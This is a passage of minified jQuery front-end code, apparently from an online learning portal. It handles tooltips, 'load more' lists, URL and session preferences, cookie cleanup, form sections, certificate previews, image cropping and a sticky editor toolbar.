n={ENT_NOQUOTES:0,ENT_HTML_QUOTE_SINGLE:1,ENT_HTML_QUOTE_DOUBLE:2,ENT_COMPAT:2,ENT_QUOTES:3,ENT_IGNORE:4};if(0===e&&(o=!0),"number"!=typeof e){for(e=[].concat(e),a=0;a<e.length;a++)0===n[e[a]]?o=!0:n[e[a]]&&(i|=n[e[a]]);e=i}return e&n.ENT_HTML_QUOTE_SINGLE&&(t=t.replace(/&#0*39;/g,"'")),o||(t=t.replace(/&quot;/g,'"')),t=t.replace(/&amp;/g,"&")}function initToolTip(t,e){$(t).each((function(){var t=$(this).attr("data-placement"),i=$(this).find(e),a=$(this).find(".tl-tooltip-content-inject").html();i.tooltip({placement:t,trigger:"manual",html:!0,title:a,delay:{show:0,hide:0}})})),$(document).on("mouseenter",t,(function(){$(this).find(e).tooltip("show")})),$(document).on("mouseleave",t,(function(){var t=$(this).find(e);t.tooltip("hide"),t.find(" ~ .tooltip").hide()}))}getHelpVideoItemTemplate(),$(document).on("click",".tl-help-videos_video-item",(function(t){openHelpVideo($(this).attr("data-title"),$(this).attr("data-url"))})),function(t){t.fn.shuffle=function(){var e=this.get(),i=t.map(e,(function(){var i,a=(i=e.length,Math.floor(Math.random()*i)),o=t(e[a]).clone()[0];return e.splice(a,1),o}));return this.each((function(e){t(this).replaceWith(t(i[e]))})),t(i)}}(jQuery),String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,"")}),$.fn.bindFirst=function(t,e){this.on(t,e),this.each((function(){var e=$._data(this,"events")[t.split(".")[0]],i=e.pop();e.splice(0,0,i)}))},$.fn.modal.Constructor.prototype.enforceFocus=function(){},$(document).ready((function(){initToolTip(".tl-js-tooltip-trigger",".tl-info-icon")})),$(document).ready((function(){$(document).on("keyup input paste change",".tl-can-clear-input input",(function(t){var e=$(this).val().length>0;$(this).closest(".tl-can-clear-input")[e?"addClass":"removeClass"]("show-clear-btn")})),$(document).on("click",".tl-clear-input-btn",(function(t){$(this).closest(".tl-can-clear-input").find("input").val("").trigger("change").trigger("keyup").focus()}))}));var debounce=function(t,e,i){var a;return function(){var o=this,n=arguments,r=function(){a=null,i||t.apply(o,n)},s=i&&!a;clearTimeout(a),a=setTimeout(r,e),s&&t.apply(o,n)}},longtouch,timeoutOperation;function isTouchDevice(){return"ontouchstart"in window||window.DocumentTouch&&document instanceof DocumentTouch}function toggleOperationsActions(t,e){if(t){var i=$(e.target).parent();i.is(".touchable")?($(".tl-table-operations-trigger").not(i).removeClass("active"),$(i).addClass("active")):$(".tl-table-operations-trigger.touchable").removeClass("active")}else $(".tl-table-operations-trigger.touchable").removeClass("active")}function hasAttribute(t,e){return void 0!==$(t).attr(e)&&!1!==$(t).attr(e)}function touchToggleOperationsActions(t){var e=$(t.target).is(".tl-table-operations-icon"),i=$(t.target).hasClass("active");e&&!i?("touchstart"==t.type&&(timeoutOperation=setTimeout((function(){longtouch=!0}),500)),"touchend"==t.type&&(longtouch||toggleOperationsActions(e,t),t.preventDefault(),longtouch=!1,clearTimeout(timeoutOperation))):e&&toggleOperationsActions(e,t)}function calculateLoadMoreHeight(t,e,i){return null!=e&&e.each((function(e){if(t<=i){var a=$(this).has("li:visible").length,o=$(this).outerHeight(!0)-(a>0?$(this).children("ul").outerHeight(!0):0);t+=o}})),t}var loadMoreContainerClass="load-more_container",loadMoreContainerActiveClass="load-more_container--active",loadMorePreLoadClass="load-more_preload",loadMorePreLoadEndedClass="load-more_preload--done",loadMoreWrapHiddenClass="load-more_wrap-btn--hidden";function loadMoreSetLabelAndHeight(t,e,i){e.text(i?myportal.app.translations.less:myportal.app.translations.more);var a=i?"none":t.attr("data-load-more-init-height")+"px";t.css("max-height",a)}function hideOuterElementsBeforeLoading(){$("[data-load-more-preload]").each((function(){$(this).addClass(loadMorePreLoadClass)}))}function showOuterElementsAfterLoading(t){var e=$('[data-load-more-preload="'+t+'"]');e.each((function(){$(this).addClass(loadMorePreLoadEndedClass)})),e.one("webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend",(function(e){removeOuterElementsAfterLoading(t)}))}function removeOuterElementsAfterLoading(t){$('[data-load-more-preload="'+t+'"]').each((function(){$(this).removeClass(loadMorePreLoadClass),$(this).removeClass(loadMorePreLoadEndedClass)}))}function getListLoadMoreContainers(t){var e=window.innerHeight/2;hideOuterElementsBeforeLoading(),$("[data-load-more-container]").each((function(){var i=$(this),a=i.attr("data-load-more-container"),o=$('[data-load-more="'+a+'"]');setTimeout((function(){var n=i.attr("data-load-more-container-group"),r=i.find("> ul > li:visible","> li:visible"),s=0,l=window.innerHeight-e,c=l/5-100,d=o.parent();n&&(c=l/$("[data-load-more-container-group='"+n+"']").length);if(c<=(s=calculateLoadMoreHeight(s,r,c)))if(i.attr("data-load-more-init-height",s),i.css("max-height",s+"px"),i.css("overflow","hidden"),d.hasClass(loadMoreWrapHiddenClass)&&d.removeClass(loadMoreWrapHiddenClass),i.hasClass(loadMoreContainerClass)||i.addClass(loadMoreContainerClass),t){(p=i.hasClass(loadMoreContainerActiveClass))&&(i.hasClass(loadMoreContainerActiveClass)&&i.removeClass(loadMoreContainerActiveClass),loadMoreSetLabelAndHeight(i,o,!1))}else{var p=i.hasClass(loadMoreContainerActiveClass);loadMoreSetLabelAndHeight(i,o,!!p)}else i.removeClass(loadMoreContainerClass),d.hasClass(loadMoreWrapHiddenClass)||d.addClass(loadMoreWrapHiddenClass);showOuterElementsAfterLoading(a)}),10)}))}function loadMoreClickEvent(t,e){var i=$("[data-load-more='"+t+"']");t instanceof jQuery&&(i=t);var a=i.attr("data-load-more"),o=$("[data-load-more-container='"+a+"']");o.toggleClass(loadMoreContainerActiveClass);var n=o.hasClass(loadMoreContainerActiveClass);loadMoreSetLabelAndHeight(o,i,n);var r=i.attr("data-load-more-keep-state");r&&changeParametersValues("loadmore",r,!!o.hasClass(loadMoreContainerActiveClass),!1,!!e)}var radioInputsElements=['.tl-marketplace-sidebar input[type="radio"]','.tl-catalog-sidebar input[type="radio"]'];function appendLabelElementAfterRadioInputs(){radioInputsElements.map((function(t){$(t).each((function(){$(this).after('<label for="'+$(this).attr("id")+'"></label>')}))}))}function toggleExpanders(t){$("#dynatree-id-"+t.data.key+" .dynatree-expander").length>0&&($("#dynatree-id-"+t.data.key+" > * span.dynatree-node:not(.hide)").length>0?($("#dynatree-id-"+t.data.key+" .dynatree-expander").show(),$("#dynatree-id-"+t.data.key+" .dynatree-checkbox").css("margin-left","3px")):($("#dynatree-id-"+t.data.key+" .dynatree-expander").hide(),$("#dynatree-id-"+t.data.key+" .dynatree-checkbox").css("margin-left","19px")))}function hoverDynatreeTitles(t){$(document).on("mouseenter",".dynatree-title",(function(){if(!$(this).hasClass("hover-show-full-title")){var e=$(this).parents("li")[0].id,i=e.substring(12,e.length),a=$(this);t.dynatree("getRoot").visit((function(t){t.data.key==i&&(a.html(t.data.fulltitle),a.addClass("hover-show-full-title"))}))}})),$(document).on("mouseleave",".dynatree-title",(function(){if($(this).hasClass("hover-show-full-title")){var e=$(this).parents("li")[0].id,i=e.substring(12,e.length),a=$(this);t.dynatree("getRoot").visit((function(t){t.data.key==i&&(a.html(t.data.title),a.removeClass("hover-show-full-title"))}))}}))}function encodeQueryData(t){var e=[];return Object.keys(t).map((function(i){e.push(encodeURIComponent(i)+":"+encodeURIComponent(t[i]))})),e.join(",")}function addParametersToAddressBar(t,e){var i=getParamsAndValuesFromUrl();i.map((function(i){i.parameter==t&&(i.values=e)})),i=i.filter((function(t){return t.values&&t.values.length>0}));var a={};i=i.map((function(t){a[t.parameter]=t.values})),i=encodeQueryData(a);var o=/[^/]*$/.exec(window.location.pathname)[0],n=window.location.pathname,r=window.location.pathname;if(/(\/|\,)([^:]+)\:([^,]+)/.test(window.location.pathname)){var s=(r=(n=window.location.pathname.replace(o,""))+(i.length>0?i:""))[r.length-1];0==i&&"/"==s&&(r=r.replace(/\/$/,""))}else r=n.indexOf("/index/")>-1?n+(i.length>0?i:""):n.indexOf("/index")>-1?n+"/"+(i.length>0?i:""):n+"/index/"+(i.length>0?i:"");sessionStorage.setItem(localStorage.getItem("store_and_replace_preferences"),i.length>0?i:"")}function changeParametersValues(t,e,i,a,o){var n=splitParameterValuesToArray(getUrlParameterValues(t)?getUrlParameterValues(t):"",",");if(void 0!==n){var r=n.indexOf(e);n=i?(-1!==r||a)&&a?addValueToParam(n,e,!0):addValueToParam(n,e):removeValueToParam(n,r)}n=cleanArray(n),o&&addParametersToAddressBar(t,n)}function cleanArray(t){for(var e=[],i=0;i<t.length;i++)t[i]&&e.push(t[i]);return e}function addValueToParam(t,e,i){return i&&(t=[]),t.push(e),cleanArray(t)}function removeValueToParam(t,e){return t.splice(e,1),t}function getUrlParameterValues(t){var e=sessionStorage.getItem(localStorage.getItem("store_and_replace_preferences"))||window.location.pathname,i=e.split("/");/([^\/]+)\:([^:]+)/.test(i[i.length-1])&&(e=i[i.length-1]);var a,o,n=e.split(",");for(o=0;o<n.length;o++)if((a=n[o].split(":"))[0]===t)return void 0===a[1]||decodeURIComponent(a[1])}function joinParameterValuesToString(t){var e=t.length>1?t.join("&"):t;return t||(e=[]),e}function splitParameterValuesToArray(t,e){var i=[];return t&&(i=t.split(e)),i=cleanArray(i)}var urlArrayParameters=["categories","search","cat","group","loadmore"];function getParamsAndValuesFromUrl(){var t=[];return urlArrayParameters.map((function(e){var i=getUrlParameterValues(e)?splitParameterValuesToArray(getUrlParameterValues(e),","):null;t.push({parameter:e,values:i})})),t=cleanArray(t)}function findIndex(t,e,i){for(var a=-1,o=0;o<e.length;++o)if(e[o][t]==i){a=o;break}return a}function findDuplicates(t,e){return t.filter((function(t){return-1!=e.indexOf(t)}))}function getParamsFromUrlWhenPageLoads(t){localStorage.getItem("store_and_replace_preferences");setTimeout((function(){triggerEventsForUrlParametersValues(getParamsAndValuesFromUrl()),$("[data-load-more-preload]").length>0&&$("[data-load-more-preload]").scrollTop(0)}),200)}function checkEventIsInitialized(t,e,i){var a=jQuery._data($(t).get(0),"events"),o=!1;return a[e]&&a[e].map((function(t){t&&void 0!==t.selector&&t.selector==i&&(o=!0)})),o}var periodicallyCheckEventTimeOutMillisecond=50;function periodicallyCheckEventIsInitialized(t,e,i,a){var o=setTimeout((function(){periodicallyCheckEventIsInitialized(t,e,i,a)}),periodicallyCheckEventTimeOutMillisecond);checkEventIsInitialized(t,e,i)&&(a(),clearTimeout(o))}function triggerEventsForUrlParametersValues(t){t&&t.length>0&&t.map((function(t){var e=t.parameter;if(t.values&&t.values.length>0){t.values.map((function(t){triggerEventsForTypes(e,t)}))}}))}function loadMoreTriggerEvents(t){loadMoreClickEvent(t,!1)}function triggerEventsForTypes(t,e){switch(t){case"loadmore":loadMoreTriggerEvents(e)}}function removeUserActionsPreferencesBasedOnKey(t){var e=localStorage.getItem(t);e&&(sessionStorage.removeItem(e),localStorage.removeItem(t))}function clearUserActionsPreferencesAndCookies(){var t=window.location.pathname;[{path:"/catalog",sessionKey:"catalog_user_actions"},{path:"/marketplace",sessionKey:"marketplace_user_actions"}].map((function(e){-1==t.indexOf(e.path)&&(localStorage.getItem("store_and_replace_preferences")==e.sessionKey&&removeUserActionsPreferencesBasedOnKey("store_and_replace_preferences"),expireCookiesFromPathIfSet(e.path))}))}function expireCookiesFromPathIfSet(t){var e=[];switch(t){case"/catalog":e=["cookie_visited_course_catalog_info","cookie_visited_course_catalog_index","catalog_selected_categories","catalog_category_visible_get_all","catalog_search_value"];break;case"/marketplace":e=["cookie_visited_marketplace_info","cookie_visited_marketplace_index","marketplace_selected_categories","marketplace_search_value","cookie_visited_course_library_index","cookie_visited_course_library_info","course_library_selected_categories","course_library_search_value"]}e.forEach((function(t){$.cookie(t)&&setTlmsCookie(t,"",{expires:-1,path:"/",domain:myEffectiveDomain,secure:!1})}))}var setState=function(t,e){$('[data-state-scope="'+t+'"]').each((function(){var t=$(this),i=t.attr("data-state-name")===e;t[i?"addClass":"removeClass"]("active")})),$(document).trigger("state:change",{scope:t,name:e})};function expandCourseDescription(){$(".course-info_main--show-more").addClass("hide"),$(".course-info_main--desc").removeClass("course-info_main--desc-long")}function showCourseDescriptionMore(){$(".course-info_main--desc").text().length>1235&&($(".course-info_main--desc").addClass("course-info_main--desc-long"),$(".course-info_main--show-more").removeClass("hide"),$(document).on("click",".course-info_main--desc-more",(function(){expandCourseDescription()}))),$(".course-info_main--desc").removeClass("hide")}$(document).on("click","[data-select-state]",(function(t){var e=$(this).attr("data-select-state").split(":"),i=e[0],a=e[1];setState(i,a)}));var openAuthModalAt=function(t,e){$("#tl-"+e+"-login-signup").modal("hide"),$("#tl-"+e+"-login-modal").modal(),setState("auth_form_view",t)},closeAuthModal=function(t){$("#tl-"+t+"-login-modal").modal("hide")},signUpformReplaceWithAlertBox=function(t,e){$("#tl-"+t+"-signup-form").replaceWith("<div class='alert alert-success tl-alert-success-signup fade in out m-0'><p>"+e+"</p></div>")};function resetGrecaptcha(){"grecaptcha"in window&&grecaptcha.reset()}function invertColor(t,e){if(0===t.indexOf("#")&&(t=t.slice(1)),3===t.length&&(t=t[0]+t[0]+t[1]+t[1]+t[2]+t[2]),6!==t.length)throw new Error("Invalid HEX color.");var i=parseInt(t.slice(0,2),16),a=parseInt(t.slice(2,4),16),o=parseInt(t.slice(4,6),16);return e?.299*i+.587*a+.114*o>186?"#000000":"#FFFFFF":(i=(255-i).toString(16),a=(255-a).toString(16),o=(255-o).toString(16),"#"+padZero(i)+padZero(a)+padZero(o))}function showElement(t){$(t).removeClass("hide")}function hideElement(t){$(t).addClass("hide")}function padZero(t,e){return e=e||2,(new Array(e).join("0")+t).slice(-e)}$(document).on("click",".btn.btn-navbar",(function(t){$(".nav-collapse.collapse").hasClass("in")?$(this).addClass("collapsed"):$(this).removeClass("collapsed")}));var invertNavbarInnerColors=debounce((function(){if(window.innerWidth<=979){var t=$(".navbar .navbar-inner");if(t.length>0){var e=t.css("backgroundColor");document.documentElement.style.setProperty("--navbar-mobile-menu-color",invertColor(convertRgbToHex(e),!0)),document.documentElement.style.setProperty("--navbar-mobile-menu-bg-color",e)}}}),200);function convertRgbToHex(t){var e=t.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/);delete e[0];for(var i=1;i<=3;++i)e[i]=parseInt(e[i]).toString(16),1==e[i].length&&(e[i]="0"+e[i]);return color="#"+e.join("")}function showSection(t,e){$('[data-section-show="'+t+'"]').fadeOut(10,(function(){fadeInSection(t),e&&$(e).focus()}))}function hideSection(t){$('[data-section-hidden="'+t+'"]').fadeOut(10,(function(){fadeInSection(t)}))}function fadeInSection(t){$("#"+t).fadeIn(10)}function initAllSections(){$("[data-section-hidden][data-section-stay-open='false']").each((function(){var t=$(this)[0];fadeInSection($(t).attr("data-section-hidden"))})),$("[data-section-hidden][data-section-stay-open='true']").each((function(){var t=$(this)[0];fadeInSection($(t).attr("id"))}))}function onChangeFocusedElement(){$(document).delegate("[data-section-focused-element]","change",(function(t){sectionStayOpen($(t.target).attr("data-section-focused-element"),""!==$.trim($(this).val()))}))}function initFocusElement(){$("[data-section-show][data-section-element-focus]").length>0&&($("[data-section-show][data-section-element-focus]").each((function(){var t=$(this)[0],e=$(t).attr("data-section-element-focus"),i=$(t).attr("id");$(e).attr("data-section-focused-element",i),""!==$.trim($(e).val())&&sectionStayOpen(i,!0)})),onChangeFocusedElement())}function sectionStayOpen(t,e){$("[data-section-hidden='"+t+"']").attr("data-section-stay-open",e)}function initHideSections(){$(document).on("click",".tl-body",(function(t){$(t.target).is(".tl-body")||$("[data-section-show]").each((function(){var e=$("[data-section-hidden='"+$(this)[0].id+"'][data-section-stay-open='false']");e.length>0&&(function(t,e,i){return!$.contains(t,i)&&!$.contains(e[0],i)}($(this)[0],e,t.target)&&!$(t.target).parents(".clockpicker-popover").length||function(t,e){return $.contains(t[0],e)&&!$(e).is("i, .tl-select2, input, .btn, .well, a, .control-label, .fileinput-button, label.checkbox")}(e,t.target))&&e.fadeOut(10,(function(){fadeInSection($(this).attr("data-section-hidden"))}))}))}))}function initShowSection(){$(document).on("click","[data-section-show] a, [data-section-show] i",(function(t){if(!$(t.target).is(".controls")){var e=$(this).parents("[data-section-show]");showSection(e.attr("data-section-show"),e.attr("data-section-element-focus"))}}))}function initSections(t){t||initFocusElement(),initAllSections(),initShowSection(),initHideSections()}function setUpLabels(t){(t?$("[data-section-hidden] input[type=text]:visible:not(.select2-focusser), [data-section-hidden] select:visible, [data-section-hidden] [data-toggle]:visible"):$("[data-section-hidden] input[type=text]:not(.select2-focusser, .select2-input, [value='']), [data-section-hidden] select, [data-section-hidden] [data-toggle]")).each((function(){var t=$(this).parents(".control-group[data-section-hidden]"),e="control-group-show-price"==t.attr("data-section-hidden")||$(this).is("#category-price")||$(this).is("#group-price"),i=""!=$.trim($(this).val())&&(0!=$.trim($(this).val())||$(this).is("[name=certification_duration_type]"))||$(this).is("[data-toggle]"),a=$(this).is("#course-coursecode")||$(this).is("#course-level")||$(this).is("[name*=section_key_point_title]")||$(this).is("#course-capacity"),o=$(this).is("#course-certification")||$(this).is("#group-branch")||$(this).is("[name*=section_key_point_icon]"),n=!($(this).is("[name=certification_duration_type]")||$(this).is("[name=certification_duration_months]")||$(this).is("#tl-reassign-when")||$(this).is("#course-intro-video-url")||$(this).is("#section-cta-url")||$(this).is("[name*=section_key_point_cta_url]")),r=!$(this).is("#start-date")&&!$(this).is("#expiration-date")&&!$(this).is("#course-timelimit"),s=$(this).is("#tl-section-cta")||$(this).is("#section-cta-url")||$(this).is("[name*=section_key_point_cta]")||$(this).is("[name*=section_key_point_cta_url]");if(i){if(t.hasClass("error"))sectionStayOpen(t.attr("data-section-hidden"),!0);else if(e)setLabel(t,l=currency+$(this).val());else if(a){setLabel(t,l=$(this).val())}else if(o){if($(this).is("[name*=section_key_point_icon]"))l=(l=$(this).find(":selected").text()).charAt(0).toUpperCase()+l.slice(1);else var l=$(this).find(":selected").text();setLabel(t,l)}else if($(this).is("#start-date")||$(this).is("#start-time")||$(this).is("#expiration-date")||$(this).is("#expiration-time")||$(this).is("#course-timelimit")){l=timeOptionsValue="";""!=$("#start-date").val()&&""!=$("#expiration-date").val()?(l=myportal.app.translations.duration,timeOptionsValue="&bull; "+$("#start-date").val()+" - "+$("#expiration-date").val()):""!=$("#start-date").val()&&""!=$("#course-timelimit").val()?(l=myportal.app.translations["start-date-and-time-limit"],timeOptionsValue="&bull; "+$("#start-date").val()+" - "+$("#course-timelimit").val()+" "+myportal.app.translations.days):""!=$("#start-date").val()?(l=myportal.app.translations["start-date"],timeOptionsValue="&bull; "+$("#start-date").val()):""!=$("#expiration-date").val()?(l=myportal.app.translations["expiration-date"],timeOptionsValue="&bull; "+$("#expiration-date").val()):""!=$("#course-timelimit").val()&&(l=myportal.app.translations["time-limit"],timeOptionsValue="&bull; "+$("#course-timelimit").val()+" "+myportal.app.translations.days),""!=l&&($("#tl-course-time-options-value-hidden").html(timeOptionsValue),$("#tl-course-time-options-value-hidden").show(),setLabel(t,l))}else if($(this).is("[name=certification_duration_type]")&&0!=$("#course-certification").val()){var c="&bull; "+($(this).find(":selected").text()==myportal.app.translations["pick-an-expiration-date"]?myportal.app.translations["expiration-date"]:$(this).find(":selected").text());$("#tl-duration-hidden").html(c),$("#tl-duration-hidden").show()}else if($(this).is("#group-key")){l=$(this).val();var d=""!=$("#group-redemptions").val()?"&bull; "+$("#group-redemptions").val()+" redemptions":"";$("#tl-redemptions-hidden").html(d),$("#tl-redemptions-hidden").show(),setLabel(t,l)}else if("control-group-show-intro-video-url"==t.attr("data-section-hidden")&&$(this).is("[data-toggle]"))if(""!=t.find("input").val()||$("#tl-intro-preview").attr("data-video-id")){var p="";$("#tl-intro-preview").attr("data-video-id")?(l=myportal.app.translations["uploaded-video"],p="javascript:void(0)",$("#tl-intro-preview-hidden a").removeAttr("target")):(l=myportal.app.translations.youtube,p=t.find("input").val(),$("#tl-intro-preview-hidden a").attr("data-video-id",""),$("#tl-intro-preview-hidden a").attr("target","_blank")),setLabel(t,l),$("#tl-intro-preview-hidden a").attr("href",p),$("#tl-intro-preview-hidden").show()}else $("#tl-intro-preview-hidden").hide(),hideLabel(t);else if(s){l=t.find("input[name*=cta]").val();var u=t.find("input[name*=cta_url]").val(),h=$("#"+t.attr("data-section-hidden")).find("#tl-link-preview");""!=u&&""!=l?(h.find("a").attr("href",u),h.show(),setLabel(t,l)):(hideLabel(t),h.find("a").attr("href",""),h.hide())}}else n&&r&&hideLabel(t),$(this).is("#group-key")&&$("#tl-redemptions-hidden").empty(),$(this).is("#course-certification")&&$("#tl-duration-hidden").empty(),$(this).is("#start-date, #expiration-date, #course-timelimit")&&""==$("#start-date").val()&&""==$("#expiration-date").val()&&""==$("#course-timelimit").val()&&(hideLabel(t),$("#tl-course-time-options-value-hidden").empty())}))}function setLabel(t,e){sectionStayOpen(t.attr("data-section-hidden"),!1),$("#"+t.attr("data-section-hidden")+" span.badge").html(e),$("#"+t.attr("data-section-hidden")+" span.badge").show()}function hideLabel(t){sectionStayOpen(t.attr("data-section-hidden"),!1),$("#"+t.attr("data-section-hidden")+" span.badge").html(""),$("#"+t.attr("data-section-hidden")+" span.badge").hide()}function disableELement(t){$(t).attr("disabled",!0)}function enableELement(t){$(t).attr("disabled",!1)}function previewCertification(t){window.certificationPreviewXHRCalls=[];var e={};t.previewButton.click((function(){t.previewButton.html(myportal.app.translations.processing),t.previewModal.modal();var i=t.certifications.val();if(i in e){var a=e[i];t.previewModal.children(".modal-body").empty().html('<div class="readbility"><div><iframe class="google-viewer" src="'+a+'" style="border: none; width: 100%;" height="400" allowfullscreen="allowfullscreen" mozallowfullscreen="mozallowfullscreen" msallowfullscreen="msallowfullscreen" oallowfullscreen="oallowfullscreen" webkitallowfullscreen="webkitallowfullscreen"></iframe></div></div>'),t.previewButton.removeClass("hide").html(myportal.app.translations.preview)}else{var o=$.ajax({url:t.initiatePreviewUrl,type:"POST",data:{id:t.certifications.val()},success:function(a){if(!$.parseJSON(a).success)return myportal.app.notify({type:"error",message:myportal.app.translations["preview-certification-error"]}),t.previewButton.removeClass("hide").html(myportal.app.translations.preview),t.previewModal.modal("hide"),!1;if(t.previewModal.hasClass("in")){var o=$.parseJSON(a).data;if(void 0===o.fileName)return myportal.app.notify({type:"error",message:myportal.app.translations["preview-certification-error"]}),t.previewButton.removeClass("hide").html(myportal.app.translations.preview),t.previewModal.modal("hide"),!1;var n=t.documentPreviewUrl.replace("##fileName##",encodeURIComponent(o.fileName));t.previewModal.children(".modal-body").empty().html('<div class="readbility"><div><iframe class="google-viewer" src="'+n+'" style="border: none; width: 100%;" height="400" allowfullscreen="allowfullscreen" mozallowfullscreen="mozallowfullscreen" msallowfullscreen="msallowfullscreen" oallowfullscreen="oallowfullscreen" webkitallowfullscreen="webkitallowfullscreen"></iframe></div></div>'),t.previewButton.removeClass("hide").html(myportal.app.translations.preview),e[i]=n}},error:function(e,i,a){return"userAbort"!==a&&myportal.app.notify({type:"error",message:myportal.app.translations["preview-certification-error"]}),t.previewButton.html(myportal.app.translations.preview),t.previewModal.modal("hide"),!1},complete:function(){}});certificationPreviewXHRCalls.push(o)}})),t.previewModal.on("hide",(function(){window.certificationPreviewXHRCalls.forEach((function(t,e){t.abort("userAbort")})),window.certificationPreviewXHRCalls=[],t.previewModal.children(".modal-body").empty().html("<div class='text-center'><h2 class='text-info' style='line-height: 50px;'>"+myportal.app.translations["wait-preview-generation"]+"</h2><img class='tl-loader-big' src='"+t.loadingImage+"'/></div>"),t.previewButton.html(myportal.app.translations.preview)}))}function populateCertificationDaysSelect(t,e){if(2==t)$('#tl-expiration-day option[value="29"]').remove(),$('#tl-expiration-day option[value="30"]').remove(),$('#tl-expiration-day option[value="31"]').remove();else if(-1!==[1,3,5,7,8,10,12].indexOf(t))for(i=29;i<=31;i++)$('#tl-expiration-day option[value="'+i+'"]').length||$("#tl-expiration-day").append('<option value="'+i+'">'+i+"</option>");else for($('#tl-expiration-day option[value="31"]').remove(),i=29;i<=30;i++)0!=$('#tl-expiration-day option[value="'+i+'"]').length&&$("#tl-expiration-day").append('<option value="'+i+'">'+i+"</option>");e&&($("#tl-expiration-day").val("1"),showSelect2&&$("#tl-expiration-day").select2().trigger("change"))}function loadAssignmentHistory(t){modalSelector=null,"tl-assignment-status-grade-modal"==t.closest(".modal").attr("id")?modalSelector="#tl-assignment-status-grade-modal":"tl-assignment-reply-modal"==t.closest(".modal").attr("id")&&(modalSelector="#tl-assignment-reply-modal"),$(modalSelector+" .tl-history-box .control-group.error").removeClass("error"),showSelect2?$(modalSelector+" .tl-history-box .tl-assignment-status").select2("val",t.attr("data-status")):$(modalSelector+".tl-history-box .tl-assignment-status").val(t.attr("data-status")),$(modalSelector+" .tl-history-box .tl-assignment-grade").val(t.attr("data-grade")),$(modalSelector+" .tl-history-box .tl-history-comments").html(t.attr("data-comments")),"#tl-assignment-status-grade-modal"==modalSelector?($(modalSelector+" .tl-grade-box").hide(),$(modalSelector+" .tl-history-box").show()):"#tl-assignment-reply-modal"==modalSelector&&($("#thegradeform").hide(),$("#thereply").hide(),$(modalSelector+" .tl-history-box").show())}function fileTypesRegex(t){return new RegExp("(.|/)("+t+")$","i")}function generalImageCropOptions(t){return{cropOptions:{canvasMaxWidth:380,canvasMaxHeight:380,selectionMaxWidth:120,selectionMaxHeight:80,selectionMinWidth:120,selectionMinHeight:80,inputPrefixName:"preview",autoOpenCrop:!0,cropOnLoad:!0},uploaderImageOptions:{autoUpload:!1,disableInputButton:!1,replaceFileInput:!1,previewMaxWidth:120,previewMaxHeight:80,acceptFileTypes:fileTypesRegex(imageAcceptedFileTypes),maxFileSize:imageMaxUploadSize,dropZone:$(t)},canvasSize:{width:courseImageCanvasSizeWidth,height:courseImageCanvasSizeHeight}}}function initCropModal(t){var e=t.buttons&&t.buttons.length>1,i='<div class="modal hide fade" id="tl-crop-modal'+getModalId(t.id)+'" class="tl-crop-modal" tabindex="-1"><div class="modal-header tl-crop-modal-header"><h3>'+myportal.app.translations.crop+'</h3><a href="javascript:void(0)" class="close tl-crop-close-modal" data-dismiss="modal">&times;</a></div><div class="modal-body text-center"><div class="tl-crop-area" class="tl-crop-body"></div></div><div class="modal-footer"><div class="btn-group dropup pull-left tl-crop-modal-group-buttons">'+(e?'<a class="btn btn-primary dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a><ul class="dropdown-menu"></ul>':"")+'</div><button type="button" class="btn btn-primary tl-process-crop">'+(t.successButtonText?t.successButtonText:myportal.app.translations.apply)+"</a></div></div>";$("body").append(i),t.buttons&&t.buttons.length>0&&t.buttons.map((function(e,i){var a=e.onClick?'onClick="'+e.onClick+'"':"";if(i>0){var o='<a href="javascript:void(0)" class="text-left" href="#" '+a+" >"+e.text+"</button>";$("#tl-crop-modal"+(t.id?"-"+t.id:"")).find(".dropdown-menu").prepend("<li>"+o+"</li>")}else{var n='<button type="button" class="btn '+e.className+'" '+a+" >"+e.text+"</button>";$("#tl-crop-modal"+(t.id?"-"+t.id:"")).find(".tl-crop-modal-group-buttons").prepend(n)}})),t.onClose&&$("#tl-crop-modal"+(t.id?"-"+t.id:"")).on("hidden.bs.modal",(function(){t.onClose()}))}function getModalChangeButton(){return{className:"btn-primary tl-change-image",text:myportal.app.translations["change-image"]}}function generalImageUploadOptions(t,e){var i="";return{changePhoto:function(){$(document).on("click","#tl-crop-modal"+getModalId(e)+" .tl-change-image",(function(){$("#tl-crop-modal"+getModalId(e)).modal("hide"),$(t).find(".preview > canvas").trigger("click")}))},setRevertImage:function(){i=$(t+" .preview").html()},revertImage:function(){0==myportal.app.isUploading&&$(t).find(".preview").html(i)}}}function getModalId(t){return t?"-"+t:""}function initUploader(t,e,i){$(t).fileupload(e),i.setRevertAvatarImage&&i.setRevertAvatarImage(),$(t).bind("fileuploadadded",(function(t,e){i.fileUploadAdded&&i.fileUploadAdded(),enableCrop(t,e,i.cropOptions,i.canvasSize)}))}$(document).ready((function(){appendLabelElementAfterRadioInputs(),"undefined"!=typeof myEffectiveDomain&&clearUserActionsPreferencesAndCookies(),invertNavbarInnerColors(),$("[data-load-more]").length>0&&(getListLoadMoreContainers(),$("[data-load-more]").on("click",(function(t){loadMoreClickEvent($(t.target),!0)})))}));var scrollStateChanged=!0,editUnitPage="#tl-edit-unit-page ",noteToolbarOffset=0;function initStickyEditor(){if(preventEditorScroll()||$(editUnitPage+".note-toolbar").hasClass("note-toolbar-scroll-init"))return!1;noteToolbarOffset=$(editUnitPage+".note-toolbar").offset().top-7,scrollStateChanged=!0,$(editUnitPage+".note-toolbar").addClass("note-toolbar-scroll-init"),$(editUnitPage+".note-editable").addClass("note-editable-scroll-init"),calculateEditorsToolbar(),manageEditorSticky(),$(window).on("scroll",{},editorEventScroll)}function manageEditorSticky(){!$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").hasClass("note-toolbar-sticked")&&$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").is(":visible")&&(noteToolbarOffset=$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").offset().top-7,scrollStateChanged=!0),$(window).scrollTop()>noteToolbarOffset&&scrollStateChanged?(scrollStateChanged=!1,$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").addClass("note-toolbar-sticked"),$(editUnitPage+".note-editable.note-editable-scroll-init").addClass("note-editable-sticky")):$(window).scrollTop()<noteToolbarOffset&&!scrollStateChanged&&(scrollStateChanged=!0,$(editUnitPage+".note-toolbar.note-toolbar-scroll-init").removeClass("note-toolbar-sticked"),$(editUnitPage+".note-editable.note-editable-scroll-init").removeClass("note-editable-sticky"))}function 